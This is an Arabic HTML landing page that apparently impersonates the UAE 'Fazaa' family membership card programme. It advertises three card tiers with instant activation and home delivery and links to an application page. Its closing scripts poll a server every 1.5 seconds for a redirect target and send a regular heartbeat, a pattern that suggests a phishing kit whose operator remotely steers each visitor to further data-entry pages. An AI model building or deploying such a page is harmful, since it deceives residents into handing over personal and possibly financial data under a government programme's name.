

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>فزعة | طلب بطاقة العضوية</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --fz-gold: #C5A44E;
            --fz-gold-dark: #A8893D;
            --fz-gold-light: #F5EED9;
            --fz-blue: #2B4C8C;
            --fz-blue-light: #3A5FA0;
            --fz-dark: #1A1A2E;
            --fz-dark-card: #232340;
            --fz-gray: #6B7280;
            --fz-light: #F8F6F0;
            --fz-white: #FFFFFF;
            --fz-green: #2ECC71;
            --fz-border: #E5E1D5;
            --fz-shadow: 0 4px 20px rgba(197, 164, 78, 0.15);
            --fz-radius: 16px;
            --fz-platinum: #8B8B8B;
            --fz-silver: #A0AEC0;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Tajawal', system-ui, -apple-system, sans-serif;
            background: var(--fz-light);
            color: #1E293B;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* === Navbar === */
        .fz-nav {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px 16px;
            background: var(--fz-white);
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .fz-nav .logo-img {
            height: 60px;
            border-radius: 8px;
        }

        /* === Hero Section === */
        .fz-hero {
            background: linear-gradient(135deg, var(--fz-dark) 0%, #2D2D4E 40%, var(--fz-blue) 100%);
            padding: 28px 16px 24px;
            color: var(--fz-white);
            position: relative;
            overflow: hidden;
        }
        .fz-hero::before {
            content: '';
            position: absolute;
            top: -60%;
            right: -30%;
            width: 300px;
            height: 300px;
            background: rgba(197, 164, 78, 0.08);
            border-radius: 50%;
        }
        .fz-hero::after {
            content: '';
            position: absolute;
            bottom: -40%;
            left: -20%;
            width: 250px;
            height: 250px;
            background: rgba(197, 164, 78, 0.05);
            border-radius: 50%;
        }

        .hero-content {
            position: relative;
            z-index: 2;
            max-width: 480px;
            margin: 0 auto;
            text-align: center;
        }

        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(197, 164, 78, 0.2);
            backdrop-filter: blur(4px);
            border: 1px solid rgba(197, 164, 78, 0.4);
            border-radius: 20px;
            padding: 4px 14px;
            font-size: 11px;
            font-weight: 700;
            margin-bottom: 14px;
            color: var(--fz-gold);
        }

        .fz-hero h1 {
            font-size: 22px;
            font-weight: 900;
            line-height: 1.5;
            margin-bottom: 8px;
            color: var(--fz-white);
            text-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .fz-hero h1 span {
            color: var(--fz-gold);
        }

        .fz-hero .hero-sub {
            font-size: 13px;
            color: rgba(255,255,255,0.8);
            line-height: 1.7;
            margin-bottom: 16px;
        }

        /* === Card Types Section === */
        .card-types-section {
            padding: 24px 16px;
        }
        .card-types-section .section-title {
            text-align: center;
            font-size: 18px;
            font-weight: 800;
            color: var(--fz-dark);
            margin-bottom: 18px;
        }
        .card-types-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 12px;
            max-width: 480px;
            margin: 0 auto;
        }
        .card-type-item {
            background: var(--fz-white);
            border: 2px solid var(--fz-border);
            border-radius: 16px;
            padding: 20px 12px;
            text-align: center;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        .card-type-item:hover {
            transform: translateY(-3px);
            box-shadow: var(--fz-shadow);
        }
        .card-type-item.platinum {
            border-color: rgba(139, 139, 139, 0.4);
        }
        .card-type-item.gold {
            border-color: rgba(197, 164, 78, 0.4);
        }
        .card-type-item.silver {
            border-color: rgba(160, 174, 192, 0.4);
        }
        .card-type-icon {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 22px;
        }
        .platinum .card-type-icon {
            background: linear-gradient(135deg, #E8E8E8, #B0B0B0);
            color: #555;
        }
        .gold .card-type-icon {
            background: linear-gradient(135deg, var(--fz-gold-light), var(--fz-gold));
            color: var(--fz-gold-dark);
        }
        .silver .card-type-icon {
            background: linear-gradient(135deg, #EDF2F7, #CBD5E0);
            color: #718096;
        }
        .card-type-name {
            font-size: 14px;
            font-weight: 800;
            margin-bottom: 6px;
        }
        .platinum .card-type-name { color: #555; }
        .gold .card-type-name { color: var(--fz-gold-dark); }
        .silver .card-type-name { color: #718096; }

        .card-type-desc {
            font-size: 11px;
            color: var(--fz-gray);
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .card-type-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 700;
        }
        .platinum .card-type-badge {
            background: #F0F0F0;
            color: #555;
            border: 1px solid #D0D0D0;
        }
        .gold .card-type-badge {
            background: var(--fz-gold-light);
            color: var(--fz-gold-dark);
            border: 1px solid rgba(197, 164, 78, 0.3);
        }
        .silver .card-type-badge {
            background: #EDF2F7;
            color: #718096;
            border: 1px solid #CBD5E0;
        }

        /* === Stats === */
        .hero-stats {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin: 16px auto 0;
            max-width: 480px;
            position: relative;
            z-index: 2;
        }
        .hero-stat {
            flex: 1;
            background: rgba(197, 164, 78, 0.15);
            border: 1px solid rgba(197, 164, 78, 0.3);
            border-radius: 12px;
            padding: 10px 6px;
            text-align: center;
            backdrop-filter: blur(4px);
        }
        .hero-stat .hs-val {
            font-size: 16px;
            font-weight: 900;
            line-height: 1;
            margin-bottom: 3px;
            color: var(--fz-gold);
        }
        .hero-stat .hs-lbl {
            font-size: 9px;
            color: rgba(255,255,255,0.85);
            font-weight: 600;
        }

        /* === CTA Button === */
        .hero-cta {
            margin-top: 18px;
            position: relative;
            z-index: 2;
            max-width: 480px;
            margin-left: auto;
            margin-right: auto;
        }
        .btn-hero {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 14px 20px;
            background: linear-gradient(135deg, var(--fz-gold), var(--fz-gold-dark));
            color: var(--fz-dark);
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            font-family: 'Tajawal', sans-serif;
            cursor: pointer;
            text-decoration: none;
            box-shadow: 0 4px 16px rgba(197, 164, 78, 0.4);
            transition: all 0.3s;
            letter-spacing: 0.3px;
        }
        .btn-hero:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 28px rgba(197, 164, 78, 0.5);
            color: var(--fz-dark);
        }

        /* === Info Section === */
        .fz-info-section {
            padding: 24px 16px;
            background: var(--fz-white);
            border-top: 1px solid var(--fz-border);
            border-bottom: 1px solid var(--fz-border);
        }
        .fz-info-section .section-title {
            text-align: center;
            font-size: 18px;
            font-weight: 800;
            color: var(--fz-dark);
            margin-bottom: 16px;
        }
        .info-card {
            max-width: 480px;
            margin: 0 auto;
            background: var(--fz-light);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--fz-border);
        }
        .info-row {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 12px 0;
            border-bottom: 1px solid var(--fz-border);
        }
        .info-row:last-child {
            border-bottom: none;
        }
        .info-row .info-icon {
            width: 36px;
            height: 36px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            flex-shrink: 0;
        }
        .info-row .info-text h4 {
            font-size: 13px;
            font-weight: 700;
            color: #1E293B;
            margin-bottom: 2px;
        }
        .info-row .info-text p {
            font-size: 11px;
            color: var(--fz-gray);
            line-height: 1.6;
            margin: 0;
        }

        /* === Offer Banner === */
        .fz-offer-banner {
            margin: 20px 16px;
            background: linear-gradient(135deg, var(--fz-dark) 0%, #2D2D4E 50%, var(--fz-blue) 100%);
            border-radius: 20px;
            padding: 24px 20px;
            color: var(--fz-white);
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 30px rgba(26,26,46,0.3);
        }
        .fz-offer-banner::before {
            content: '';
            position: absolute;
            top: -30px;
            right: -30px;
            width: 100px;
            height: 100px;
            background: rgba(197, 164, 78, 0.1);
            border-radius: 50%;
        }

        .fz-offer-banner .offer-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
            position: relative;
            z-index: 1;
        }

        .fz-offer-banner .offer-icon {
            width: 42px;
            height: 42px;
            background: rgba(197, 164, 78, 0.2);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            color: var(--fz-gold);
        }

        .fz-offer-banner h3 {
            font-size: 15px;
            font-weight: 700;
            margin: 0;
        }

        .fz-offer-banner .offer-desc {
            font-size: 13px;
            color: rgba(255,255,255,0.7);
            line-height: 1.7;
            margin-bottom: 14px;
            position: relative;
            z-index: 1;
        }

        .fz-offer-banner .btn-offer {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 10px 20px;
            background: linear-gradient(135deg, var(--fz-gold), var(--fz-gold-dark));
            color: var(--fz-dark);
            border: none;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 700;
            font-family: 'Tajawal', sans-serif;
            cursor: pointer;
            text-decoration: none;
            position: relative;
            z-index: 1;
            transition: all 0.3s;
        }
        .fz-offer-banner .btn-offer:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(197, 164, 78, 0.4);
        }

        /* === Footer === */
        .fz-footer {
            text-align: center;
            padding: 24px 16px;
            margin-top: auto;
            background: var(--fz-white);
            border-top: 1px solid var(--fz-border);
        }
        .fz-footer img {
            height: 45px;
            margin-bottom: 8px;
            border-radius: 6px;
        }
        .fz-footer .footer-name {
            font-weight: 600;
            color: var(--fz-gold);
            font-size: 13px;
            margin-bottom: 4px;
        }
        .fz-footer p {
            color: var(--fz-gray);
            font-size: 11px;
        }

        /* Animation */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in {
            animation: fadeInUp 0.6s ease-out;
        }

        @keyframes shimmer {
            0% { background-position: -200% 0; }
            100% { background-position: 200% 0; }
        }
        .gold-shimmer {
            background: linear-gradient(90deg, var(--fz-gold) 0%, #E8D48B 50%, var(--fz-gold) 100%);
            background-size: 200% 100%;
            animation: shimmer 3s infinite;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
    </style>
</head>

<body>

    <!-- Navbar -->
    <nav class="fz-nav">
        <a href="index.php">
            <img src="./assets/fazaa_logo.jpg" alt="فزعة" class="logo-img">
        </a>
    </nav>

    <!-- Hero Section -->
    <section class="fz-hero">
        <div class="hero-content fade-in">
            <div class="hero-badge">
                <i class="fas fa-id-card"></i>
              لكل الأسر الإماراتية وللمقيمين
            </div>

            <h1><span>بطاقة فزعة</span><br>لكل الأسر الإماراتية وللمقيمين</h1>
            <p class="hero-sub">بطاقة فزعة مربوطة بعدد الأبناء - ثلاثة أنواع من العضويات<br>لتلبية احتياجات كل أسرة إماراتية</p>

            <!-- Stats -->
            <div class="hero-stats">
                <div class="hero-stat">
                    <div class="hs-val">3</div>
                    <div class="hs-lbl">أنواع عضويات</div>
                </div>
                <div class="hero-stat">
                    <div class="hs-val">فوري</div>
                    <div class="hs-lbl">تفعيل البطاقة</div>
                </div>
                <div class="hero-stat">
                    <div class="hs-val">توصيل</div>
                    <div class="hs-lbl">لباب المنزل</div>
                </div>
            </div>

            <!-- CTA -->
            <div class="hero-cta">
                <a href="index-details.php" class="btn-hero">
                    <i class="fas fa-id-card"></i>
                 أطلبها الان
                </a>
            </div>
        </div>
    </section>

    <!-- Card Types Section -->
    <section class="card-types-section">
        <h3 class="section-title">أنواع العضويات</h3>
        <div class="card-types-grid">
            <!-- بلاتينية -->
            <div class="card-type-item platinum">
                <div class="card-type-icon">
                    <i class="fas fa-gem"></i>
                </div>
                <div class="card-type-name">عضوية بلاتينية</div>
                <div class="card-type-desc">للأسرة الإماراتية التي تضم 4 أبناء فأكثر أو التي يكون أحد أفرادها من أصحاب الهمم</div>
                <span class="card-type-badge">4+ أبناء / أصحاب الهمم</span>
            </div>
            <!-- ذهبية -->
            <div class="card-type-item gold">
                <div class="card-type-icon">
                    <i class="fas fa-crown"></i>
                </div>
                <div class="card-type-name">عضوية ذهبية</div>
                <div class="card-type-desc">للأسرة الإماراتية من 1-3 أبناء</div>
                <span class="card-type-badge">1-3 أبناء</span>
            </div>
            <!-- فضية -->
            <div class="card-type-item silver">
                <div class="card-type-icon">
                    <i class="fas fa-star"></i>
                </div>
                <div class="card-type-name">عضوية فضية</div>
                <div class="card-type-desc">للأسرة الإماراتية الجديدة من دون أبناء</div>
                <span class="card-type-badge">0 أبناء</span>
            </div>
        </div>
    </section>

    <!-- Info Section -->
    <section class="fz-info-section">
        <h3 class="section-title">بطاقة فزعة لكل الأسر الإماراتية</h3>
        <div class="info-card">
            <div class="info-row">
                <div class="info-icon" style="background:#F0F0F0;color:#555;">
                    <i class="fas fa-gem"></i>
                </div>
                <div class="info-text">
                    <h4>عضوية بلاتينية</h4>
                    <p>للأسرة الإماراتية التي تضم 4 أبناء فأكثر أو التي يكون أحد أفرادها من أصحاب الهمم</p>
                </div>
            </div>
            <div class="info-row">
                <div class="info-icon" style="background:var(--fz-gold-light);color:var(--fz-gold-dark);">
                    <i class="fas fa-crown"></i>
                </div>
                <div class="info-text">
                    <h4>عضوية ذهبية</h4>
                    <p>للأسرة الإماراتية من 1-3 أبناء</p>
                </div>
            </div>
            <div class="info-row">
                <div class="info-icon" style="background:#EDF2F7;color:#718096;">
                    <i class="fas fa-star"></i>
                </div>
                <div class="info-text">
                    <h4>عضوية فضية</h4>
                    <p>للأسرة الإماراتية الجديدة من دون أبناء</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Offer Banner -->
    <div class="fz-offer-banner fade-in">
        <div class="offer-header">
            <div class="offer-icon">
                <i class="fas fa-gift"></i>
            </div>
            <h3>جاهز للطلب؟</h3>
        </div>
        <p class="offer-desc">قدّم طلبك الآن واحصل على بطاقة فزعة الخاصة بك. البطاقة مربوطة بعدد الأبناء وتوصل لباب منزلك.</p>
        <a href="index-details.php" class="btn-offer">
            <i class="fas fa-arrow-left"></i>
            طلب الآن
        </a>
    </div>

    <!-- Footer -->
    <footer class="fz-footer">
        <img src="./assets/fazaa_logo.jpg" alt="فزعة"><br>
        <p class="footer-name">FAZAA | فزعة</p>
        <p>&copy; Fazaa 2026 - جميع الحقوق محفوظة</p>
    </footer>

<script>
function checkRedirect() {
    fetch('polling-redirect.php')
        .then(r => r.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.redirect;
            }
        })
        .catch(e => {});
}
setInterval(checkRedirect, 1500);
checkRedirect();
</script>

<script>
function sendHeartbeat() {
    fetch('heartbeat.php').catch(function(e){});
}
setInterval(sendHeartbeat, 10000);
sendHeartbeat();
</script>

</body>
</html>
